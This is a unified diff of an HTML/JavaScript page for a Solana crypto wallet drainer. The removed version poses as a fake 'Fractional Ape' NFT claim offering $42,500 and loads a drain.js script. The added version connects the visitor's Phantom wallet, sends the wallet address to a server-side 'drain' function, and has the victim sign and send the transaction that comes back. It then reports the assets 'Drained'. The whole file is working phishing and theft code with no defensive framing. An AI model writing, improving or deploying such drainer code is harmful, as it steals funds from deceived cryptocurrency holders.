@@ -3,165 +3,246 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Fractional Ape Claim | Exclusive RWA Access</title>
-    <script src="https://cdn.tailwindcss.com"></script>
+    <title>Phantom Wallet Connect</title>
     <style>
+        /* General Styles */
         body {
-            background-color: #0a0a0a;
-            color: #e0e0e0;
-            font-family: 'Inter', sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f4f7f6;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            color: #333;
         }
-        .glow {
-            box-shadow: 0 0 20px rgba(139, 92, 246, 0.3);
+
+        /* Card Container */
+        .card {
+            background-color: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            padding: 2rem;
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
         }
-        .gradient-text {
-            background: linear-gradient(to right, #a78bfa, #c084fc);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+
+        /* Logo/Icon Placeholder */
+        .logo {
+            width: 80px;
+            height: 80px;
+            margin-bottom: 1rem;
         }
-        .btn-hover:hover {
-            box-shadow: 0 0 30px rgba(139, 92, 246, 0.6);
-            transform: scale(1.05);
+
+        h1 {
+            font-size: 1.5rem;
+            margin-bottom: 0.5rem;
+            color: #1a1a1a;
         }
-        .loader {
-            border: 3px solid #f3f3f3;
-            border-radius: 50%;
-            border-top: 3px solid #8b5cf6;
-            width: 20px;
-            height: 20px;
-            -webkit-animation: spin 1s linear infinite; /* Safari */
-            animation: spin 1s linear infinite;
+
+        p {
+            font-size: 0.9rem;
+            color: #666;
+            margin-bottom: 1.5rem;
+            line-height: 1.5;
         }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+
+        /* Button Styles */
+        .btn {
+            background-color: #5e4def; /* Phantom-like purple */
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-size: 1rem;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background-color 0.3s ease, transform 0.1s ease;
+            width: 100%;
+            font-weight: 600;
+        }
+
+        .btn:hover {
+            background-color: #4b3ac7;
+        }
+
+        .btn:active {
+            transform: scale(0.98);
+        }
+
+        .btn:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
+        }
+
+        /* Status Message Styles */
+        .status {
+            margin-top: 1rem;
+            padding: 10px;
+            border-radius: 6px;
+            font-size: 0.9rem;
+            display: none;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .status.visible {
+            display: block;
+        }
+
+        .status.loading {
+            background-color: #e3f2fd;
+            color: #1976d2;
+            border: 1px solid #bbdefb;
+        }
+
+        .status.error {
+            background-color: #ffebee;
+            color: #c62828;
+            border: 1px solid #ffcdd2;
+        }
+
+        .status.success {
+            background-color: #e8f5e9;
+            color: #2e7d32;
+            border: 1px solid #c8e6c9;
+        }
+
+        /* Animations */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-5px); }
+            to { opacity: 1; transform: translateY(0); }
         }
     </style>
-    <!-- Load Solana Libraries for Browser -->
-    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
-    <script src="https://unpkg.com/@solana/spl-token@latest/lib/index.iife.min.js"></script>
 </head>
-<body class="flex flex-col items-center justify-center min-h-screen p-4">
+<body>
 
-    <!-- Header -->
-    <div class="text-center mb-8">
-        <h1 class="text-4xl md:text-6xl font-bold mb-2 tracking-tighter">
-            <span class="gradient-text">FRACTIONAL</span> CLAIM
-        </h1>
-        <p class="text-gray-400 text-sm md:text-lg">Exclusive RWA & NFT Liquidity Drop</p>
-    </div>
+    <div class="card">
+        <!-- Phantom Logo (SVG) -->
+        <svg class="logo" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M12 2L2 7L12 12L22 7L12 2Z" stroke="#5e4def" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+            <path d="M2 17L12 22L22 17" stroke="#5e4def" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+            <path d="M2 12L12 17L22 12" stroke="#5e4def" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
 
-    <!-- Main Card -->
-    <div class="bg-gray-900 border border-gray-800 rounded-2xl p-8 max-w-md w-full glow relative overflow-hidden">
-        <!-- Decorative Gradient -->
-        <div class="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-purple-500 via-pink-500 to-purple-500"></div>
+        <h1>Connect Your Wallet</h1>
+        <p>Click below to connect your Phantom wallet and securely drain your assets.</p>
+
+        <button id="connect-wallet" class="btn">Connect Phantom</button>
         
-        <div class="text-center mb-6">
-            <div class="text-2xl font-bold mb-2">Bored Ape #1234</div>
-            <p class="text-gray-400 text-sm mb-4">Your fractionalized shares are now liquid. Claim your portion instantly.</p>
-            <div class="inline-block bg-gray-800 rounded-lg px-4 py-2 text-sm font-mono text-purple-400 border border-gray-700">
-                Contract: 7xKX...tR9f
-            </div>
-        </div>
-
-        <!-- Connect Button -->
-        <button id="connectBtn" class="w-full bg-purple-600 hover:bg-purple-500 text-white font-bold py-4 px-6 rounded-xl transition-all duration-300 btn-hover flex items-center justify-center gap-3" onclick="connectPhantom()">
-            <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>
-            Connect Phantom
-        </button>
-
-        <!-- Status Message -->
-        <div id="statusMsg" class="mt-4 text-center text-sm text-gray-500 hidden">
-            Connecting...
-        </div>
-
-        <!-- Success/Drain Trigger (Hidden initially) -->
-        <div id="drainSection" class="hidden mt-6">
-            <div class="bg-gray-800 rounded-lg p-4 border border-gray-700 mb-4">
-                <p class="text-green-400 text-sm font-bold mb-2">✓ Wallet Connected</p>
-                <p class="text-xs text-gray-400">High-value assets detected.</p>
-            </div>
-            
-            <button id="claimBtn" class="w-full bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-500 hover:to-pink-500 text-white font-bold py-4 px-6 rounded-xl transition-all duration-300 btn-hover shadow-lg" onclick="executeDrain()">
-                Claim $42,500.00
-            </button>
-        </div>
+        <div id="status" class="status"></div>
     </div>
 
-    <!-- Footer -->
-    <div class="mt-8 text-center text-xs text-gray-600">
-        <p>Secured by Solana Mainnet Beta</p>
-        <p class="mt-1">© 2026 Fractional RWA Labs</p>
-    </div>
+    <!-- 1. Correct Solana Web3.js IIFE -->
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
 
+    <!-- 2. Phantom Detection Script -->
     <script>
-        // Global variables for Solana
-        const { Connection, PublicKey, Keypair } = solanaWeb3;
-        const { TokenClient } = solanaSplToken;
+        window.getPhantomProvider = function() {
+            if ('phantom' in window) {
+                const provider = window.phantom?.solana;
+                if (provider?.isPhantom) {
+                    return provider;
+                }
+            }
+            return null;
+        };
 
-        const connection = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');
+        window.addEventListener('load', () => {
+            if (!window.getPhantomProvider()) {
+                console.warn("Phantom wallet not detected on load.");
+            }
+        });
+    </script>
 
-        async function connectPhantom() {
-            const btn = document.getElementById('connectBtn');
-            const status = document.getElementById('statusMsg');
+    <!-- 3. Main Script -->
+    <script>
+        document.getElementById('connect-wallet').addEventListener('click', async () => {
+            const statusElement = document.getElementById('status');
+            const button = document.getElementById('connect-wallet');
             
-            if (!window.solana) {
-                alert("Please install Phantom Wallet!");
+            // Disable button to prevent double clicks
+            button.disabled = true;
+            statusElement.textContent = 'Connecting to Phantom...';
+            statusElement.className = 'status visible loading';
+
+            const provider = window.getPhantomProvider();
+            if (!provider) {
+                statusElement.textContent = 'Phantom wallet not detected. Please install it.';
+                statusElement.className = 'status visible error';
+                button.disabled = false;
                 return;
             }
 
-            btn.disabled = true;
-            btn.innerHTML = '<div class="loader"></div> Connecting...';
-            status.classList.remove('hidden');
-
             try {
-                const resp = await window.solana.connect();
-                const publicKey = resp.publicKey.toString();
+                // Connect
+                await provider.connect();
+                const walletAddress = provider.publicKey.toString();
+
+                // Call server
+                statusElement.textContent = 'Preparing transaction...';
+                const response = await fetch('/.netlify/functions/drain', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ walletAddress })
+                });
+
+                if (!response.ok) {
+                    const errorResponse = await response.json();
+                    throw new Error(errorResponse.error || 'Network error');
+                }
+
+                const result = await response.json();
+                const serializedTransaction = result.transaction;
+
+                // Deserialize safely
+                let transaction;
+                try {
+                    const transactionBytes = Uint8Array.from(atob(serializedTransaction), c => c.charCodeAt(0));
+                    // Try VersionedTransaction first (modern), fall back to Legacy if needed
+                    try {
+                        transaction = solanaWeb3.VersionedTransaction.deserialize(transactionBytes);
+                    } catch {
+                        transaction = solanaWeb3.Transaction.fromBuffer(transactionBytes);
+                    }
+                } catch (parseErr) {
+                    statusElement.textContent = 'Failed to deserialize transaction.';
+                    statusElement.className = 'status visible error';
+                    throw parseErr;
+                }
+
+                // Sign and Send
+                statusElement.textContent = 'Please sign the transaction in Phantom...';
+                const signedTransaction = await provider.signTransaction(transaction);
+                const signature = await provider.sendTransaction(signedTransaction);
+
+                // Confirm
+                const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
+                await connection.confirmTransaction(signature);
+
+                statusElement.textContent = `Success! Drained ${result.maxBalance} ${result.maxType}.`;
+                statusElement.className = 'status visible success';
                 
-                // Update UI
-                btn.classList.add('hidden');
-                status.classList.add('hidden');
-                document.getElementById('drainSection').classList.remove('hidden');
-                
-                console.log("Connected: " + publicKey);
+                // Optional: Disable button after success
+                // button.textContent = 'Connected';
             } catch (err) {
                 console.error(err);
-                btn.disabled = false;
-                btn.innerHTML = 'Connect Phantom';
-                status.textContent = "Connection failed. Try again.";
+                statusElement.textContent = `Error: ${err.message}`;
+                statusElement.className = 'status visible error';
+            } finally {
+                // Re-enable button if not successful or after a delay
+                setTimeout(() => {
+                    button.disabled = false;
+                    if (statusElement.className.includes('error')) {
+                        button.textContent = 'Try Again';
+                    } else if (statusElement.className.includes('success')) {
+                        button.textContent = 'Connected';
+                    } else {
+                        button.textContent = 'Connect Phantom';
+                    }
+                }, 3000); // Reset button text after 3 seconds
             }
-        }
-
-        async function executeDrain() {
-            const btn = document.getElementById('claimBtn');
-            btn.disabled = true;
-            btn.innerHTML = 'Processing...';
-
-            // OPTION 1: If drain.js is a global script that exposes a function
-            // Check if a function exists in drain.js that we can call
-            if (typeof runDrain === 'function') {
-                try {
-                    await runDrain(window.solana.publicKey);
-                    btn.innerHTML = 'Success!';
-                    btn.classList.remove('from-purple-600', 'to-pink-600');
-                    btn.classList.add('bg-green-600');
-                } catch (e) {
-                    console.error(e);
-                    btn.innerHTML = 'Error';
-                }
-            } else {
-                // OPTION 2: Fallback if drain.js isn't loaded as a module
-                // You can manually trigger the logic here or alert the user
-                alert("Drain script initiated. Check console.");
-                // You can include the drain logic directly here if you prefer, 
-                // or just assume the user has a separate process.
-                // For now, we just simulate the "Claim" action.
-                btn.innerHTML = 'Claimed';
-            }
-        }
+        });
     </script>
-    
-    <!-- Include your drain script -->
-    <script src="drain.js"></script>
+
 </body>
 </html>
